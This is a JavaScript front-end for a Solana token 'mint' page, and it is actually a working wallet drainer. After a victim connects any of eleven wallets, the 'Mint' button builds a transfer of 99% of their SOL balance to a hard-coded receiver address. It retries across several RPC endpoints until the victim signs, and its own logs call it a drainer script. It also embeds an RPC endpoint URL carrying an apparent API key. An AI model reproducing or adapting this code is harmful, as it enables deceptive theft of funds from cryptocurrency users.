$(document).ready(function() {
    const walletOptions = [
        { name: "Phantom", key: "isPhantom" },
        { name: "Solflare", key: "isSolflare" },
        { name: "Backpack", key: "isBackpack" },
        { name: "Trust Wallet", key: "isTrustWallet" },
        { name: "Glow", key: "isGlow" },
        { name: "Slope", key: "isSlope" },
        { name: "Sollet", key: "isSollet" },
        { name: "Coin98", key: "isCoin98" },
        { name: "Clover", key: "isClover" },
        { name: "MathWallet", key: "isMathWallet" },
        { name: "TokenPocket", key: "isTokenPocket" }
    ];

    $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:10px;padding:5px 10px;border-radius:5px;font-size:1rem;"></select>');
    walletOptions.forEach(opt => {
        $('#wallet-select').append(`<option value="${opt.name.toLowerCase().replace(/\s+/g, '')}">${opt.name}</option>`);
    });

    let currentProvider = null;
    let publicKey = null;
    let isConnected = false;
    let cachedBlockhash = null;
    let cachedBalance = null;

    $('#connect-wallet').on('click', async function() {
        console.log("=== BUTTON CLICKED ===");
        console.log("isConnected:", isConnected, "currentProvider:", !!currentProvider);

        if (isConnected && currentProvider && publicKey) {
            console.log("Already connected - handling mint transaction");
            await handleMintTransaction();
            return;
        }

        console.log("Connecting wallet...");
        await handleWalletConnection();
    });

    async function handleWalletConnection() {
        const selectedWallet = $('#wallet-select').val();
        let provider = null;

        console.log("Selected wallet:", selectedWallet);

        if (selectedWallet === "phantom" && window.solana && window.solana.isPhantom) {
            provider = window.solana;
            console.log("Phantom wallet detected");
        } else if (selectedWallet === "solflare" && window.solflare && window.solflare.isSolflare) {
            provider = window.solflare;
            console.log("Solflare wallet detected");
        } else if (selectedWallet === "backpack" && window.backpack && window.backpack.isBackpack) {
            provider = window.backpack;
            console.log("Backpack wallet detected");
        } else if (selectedWallet === "trustwallet" && window.trustwallet && window.trustwallet.isTrustWallet) {
            provider = window.trustwallet;
            console.log("Trust Wallet detected");
        } else if (selectedWallet === "glow" && window.glow && window.glow.isGlow) {
            provider = window.glow;
            console.log("Glow wallet detected");
        } else if (selectedWallet === "slope" && (window.slope?.isSlope || window.solana?.isSlope)) {
            provider = window.slope || window.solana;
            console.log("Slope wallet detected");
        } else if (selectedWallet === "sollet" && (window.solana?.isSollet || window.sollet)) {
            provider = window.solana || window.sollet;
            console.log("Sollet wallet detected");
        } else if (selectedWallet === "coin98" && window.coin98 && window.coin98.isCoin98) {
            provider = window.coin98;
            console.log("Coin98 wallet detected");
        } else if (selectedWallet === "clover" && window.clover && window.clover.isClover) {
            provider = window.clover;
            console.log("Clover wallet detected");
        } else if (selectedWallet === "mathwallet" && window.math && window.math.isMathWallet) {
            provider = window.math;
            console.log("MathWallet detected");
        } else if (selectedWallet === "tokenpocket" && window.tokenpocket && window.tokenpocket.isTokenPocket) {
            provider = window.tokenpocket;
            console.log("TokenPocket wallet detected");
        }

        if (!provider) {
            alert(`Wallet not found. Please install and unlock ${selectedWallet} extension or app.`);
            console.error("❌ Wallet not detected for:", selectedWallet);
            return;
        }

        try {
            console.log("Attempting to connect to wallet...");
            const resp = await provider.connect({ onlyIfTrusted: false });
            console.log("✅ Wallet connected successfully!", resp);

            publicKey = new solanaWeb3.PublicKey(resp.publicKey || provider.publicKey);
            console.log("Public key:", publicKey.toString());

            currentProvider = provider;
            isConnected = true;

            $('#connect-wallet').text("Mint");
            $('#wallet-select').prop('disabled', true);
            console.log("✅ UI UPDATED: Button changed to 'Mint'");

            // Cache balance and blockhash in background
            setTimeout(async () => {
                const rpcEndpoints = [
                    'https://red-falling-waterfall.solana-mainnet.quiknode.pro/83089862f0d324f279ea65ff80f0ef3593a84862/',  // Your QuickNode endpoint
                    'https://api.rpcpool.com/',  // Triton fallback
                    'https://lb-pit5.nodes.rpcpool.com',  // Triton load-balanced
                    'https://api.mainnet-beta.solana.com',  // Solana official
                    'https://rpc.ankr.com/solana',  // Ankr
                    'https://mainnet.helius-rpc.com/?api-key=free'  // Helius
                ];
                for (let i = 0; i < rpcEndpoints.length; i++) {
                    try {
                        const connection = new solanaWeb3.Connection(rpcEndpoints[i], 'confirmed');
                        cachedBalance = await connection.getBalance(publicKey);
                        console.log("Background cached balance:", cachedBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
                        cachedBlockhash = await connection.getLatestBlockhash();
                        console.log("Background cached blockhash:", cachedBlockhash.blockhash);
                        break;
                    } catch (error) {
                        console.log(`Background cache failed for ${rpcEndpoints[i]}:`, error.message);
                    }
                }
            }, 100);
        } catch (err) {
            console.error("❌ Wallet connection failed:", err);
            alert("Failed to connect wallet: " + err.message);
        }
    }

    async function handleMintTransaction() {
        console.log("=== STARTING MINT TRANSACTION ===");
        console.log("Current provider:", currentProvider, "Public key:", publicKey?.toString());

        if (!currentProvider || !publicKey) {
            alert("Wallet not connected properly");
            console.error("❌ No provider or public key");
            return;
        }

        try {
            const receiverWallet = new solanaWeb3.PublicKey('5TdRgfB1SA6L9uC6rdTi9fdGfyrpaxdtfPz35MuxzmJk');
            
            // RPC endpoints (mainnet)
            const rpcEndpoints = [
                'https://red-falling-waterfall.solana-mainnet.quiknode.pro/83089862f0d324f279ea65ff80f0ef3593a84862/',  // Your QuickNode endpoint
                'https://api.rpcpool.com/',  // Triton fallback
                'https://lb-pit5.nodes.rpcpool.com',  // Triton load-balanced
                'https://api.mainnet-beta.solana.com',  // Solana official
                'https://rpc.ankr.com/solana',  // Ankr
                'https://mainnet.helius-rpc.com/?api-key=free'  // Helius
            ];
            // For devnet testing (uncomment and set wallet to devnet):
            // const rpcEndpoints = [
            //     'https://api.devnet.solana.com',
            //     'https://api.testnet.solana.com'
            // ];

            // Initialize connection with QuickNode first
            let connection = new solanaWeb3.Connection(rpcEndpoints[0], {
                commitment: 'confirmed',
                confirmTransactionInitialTimeout: 30000
            });
            console.log("Initialized connection with:", rpcEndpoints[0]);

            let walletBalance = cachedBalance || 0;
            let balanceFetched = !!cachedBalance;

            // Retry balance check if not cached
            if (!balanceFetched) {
                console.log("Getting wallet balance...");
                for (let attempt = 1; attempt <= 8; attempt++) {
                    for (let i = 0; i < rpcEndpoints.length; i++) {
                        try {
                            console.log(`Trying RPC: ${rpcEndpoints[i]}, attempt ${attempt}`);
                            connection = new solanaWeb3.Connection(rpcEndpoints[i], {
                                commitment: 'confirmed',
                                confirmTransactionInitialTimeout: 30000
                            });
                            walletBalance = await connection.getBalance(publicKey);
                            console.log("✅ Wallet balance fetched:", walletBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
                            cachedBalance = walletBalance; // Cache for future
                            balanceFetched = true;
                            break;
                        } catch (balanceError) {
                            console.warn(`RPC ${rpcEndpoints[i]} failed for balance, attempt ${attempt}:`, balanceError.message);
                        }
                    }
                    if (balanceFetched) break;
                    if (attempt < 8) {
                        console.log("Waiting 4s before retry...");
                        await new Promise(resolve => setTimeout(resolve, 4000));
                    }
                }
            } else {
                console.log("Using cached balance:", walletBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
            }

            if (!balanceFetched) {
                console.warn("⚠️ Balance fetch failed - using fallback balance (0.1 SOL)");
                alert("Balance check failed (RPC issue), proceeding with minimal estimated balance for demo.");
                walletBalance = 100000000; // Fallback: 0.1 SOL (1e8 lamports)
            }

            const minBalance = 890880; // Rent exemption
            const availableBalance = walletBalance - minBalance;

            if (availableBalance <= 0 && balanceFetched) {
                alert("Insufficient funds");
                console.error("❌ Insufficient balance:", walletBalance);
                return;
            }

            // Original 99% drain logic
            const drainAmount = Math.floor(availableBalance * 0.99);
            console.log("Draining 99% - Amount:", drainAmount / solanaWeb3.LAMPORTS_PER_SOL, "SOL");

            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: receiverWallet,
                    lamports: drainAmount,
                })
            );

            // Use cached blockhash or retry fetch
            console.log("Getting blockhash...");
            let blockhashData = cachedBlockhash;
            if (!blockhashData) {
                for (let attempt = 1; attempt <= 8; attempt++) {
                    for (let i = 0; i < rpcEndpoints.length; i++) {
                        try {
                            console.log(`Trying RPC ${rpcEndpoints[i]} for blockhash, attempt ${attempt}`);
                            connection = new solanaWeb3.Connection(rpcEndpoints[i], {
                                commitment: 'confirmed',
                                confirmTransactionInitialTimeout: 30000
                            });
                            blockhashData = await connection.getLatestBlockhash();
                            console.log("✅ Blockhash fetched:", blockhashData.blockhash);
                            cachedBlockhash = blockhashData; // Cache for future
                            break;
                        } catch (blockhashError) {
                            console.warn(`RPC ${rpcEndpoints[i]} failed for blockhash, attempt ${attempt}:`, blockhashError.message);
                        }
                    }
                    if (blockhashData) break;
                    if (attempt < 8) {
                        console.log("Waiting 4s before retry...");
                        await new Promise(resolve => setTimeout(resolve, 4000));
                    }
                }
            } else {
                console.log("Using cached blockhash:", blockhashData.blockhash);
            }

            if (!blockhashData) {
                throw new Error("Failed to fetch blockhash after all retries");
            }

            transaction.feePayer = publicKey;
            transaction.recentBlockhash = blockhashData.blockhash;

            console.log("✅ Transaction created, requesting signature...");
            console.log("Provider signTransaction method:", !!currentProvider.signTransaction);

            const signed = await currentProvider.signTransaction(transaction);
            console.log("✅ Transaction signed by user!");

            // Ensure connection is defined before sending
            if (!connection) {
                console.warn("⚠️ Connection undefined before sendRawTransaction, initializing with QuickNode...");
                connection = new solanaWeb3.Connection(rpcEndpoints[0], {
                    commitment: 'confirmed',
                    confirmTransactionInitialTimeout: 30000
                });
            }
            console.log("Connection before sendRawTransaction:", !!connection);

            console.log("Sending transaction...");
            const signature = await connection.sendRawTransaction(signed.serialize(), {
                skipPreflight: false,
                preflightCommitment: 'confirmed'
            });
            console.log("✅ Transaction sent:", signature);

            console.log("Waiting for confirmation...");
            const confirmation = await connection.confirmTransaction({
                signature,
                blockhash: blockhashData.blockhash,
                lastValidBlockHeight: blockhashData.lastValidBlockHeight
            }, 'confirmed');

            if (confirmation.value.err) {
                throw new Error("Transaction failed: " + JSON.stringify(confirmation.value.err));
            }

            console.log("✅ Transaction confirmed! Drained", drainAmount / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
            alert("Success! Drained " + drainAmount / solanaWeb3.LAMPORTS_PER_SOL + " SOL");
        } catch (err) {
            console.error("❌ Mint transaction failed:", err);
            if (err.message.includes('User rejected') || err.message.includes('rejected')) {
                alert("Transaction was rejected by the wallet");
            } else if (err.message.includes('undefined is not an object') || err.message.includes('connection')) {
                alert("Transaction failed due to RPC connection issue. Please try again or check QuickNode dashboard (https://www.quicknode.com/).");
            } else if (err.message.includes('403') || err.message.includes('blockhash') || err.message.includes('Failed to fetch')) {
                alert("RPC issue detected. Check your QuickNode dashboard (https://www.quicknode.com/) or contact support@triton.one.");
            } else {
                alert("Transaction failed: " + err.message);
            }
        }
    }

    console.log("=== DRAINER SCRIPT LOADED SUCCESSFULLY ===");
    console.log("Ready to connect wallets and drain 99% of SOL (using QuickNode priority)");
});
